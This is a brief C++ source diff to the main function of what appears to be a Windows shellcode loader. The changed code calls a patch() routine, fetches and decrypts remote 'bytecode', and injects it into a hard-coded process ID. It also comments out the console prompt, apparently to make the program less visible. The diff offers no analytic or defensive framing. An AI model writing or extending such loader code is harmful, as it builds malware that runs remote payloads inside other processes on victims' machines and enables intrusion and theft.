@@ -3,19 +3,19 @@
 #include "retrieve/fetch.hpp"
 #include "static/vars.hpp"
 
-#include <iostream>
+#include <cstdio>
+// #include <iostream>
 #include <vector>
+#include <wincrypt.h>
+#include "inject/inject.hpp"
 
 int main() {
-  try {
-    std::vector<unsigned char> bytecode = decrypt_bytecode(retrieve_bytecode());
-  } catch (const std::exception &e) {
-    std::cerr << "[!] Exception: " << e.what() << "\n";
-  }
   patch();
+  std::vector<unsigned char> bytecode = decrypt_bytecode(retrieve_bytecode());
+  inject(bytecode, 5208);
 
-  std::cout << "Press Enter to exit...";
-  std::cin.get();
+  // std::cout << "Press Enter to exit...";
+  // std::cin.get();
 
   return 0;
 }
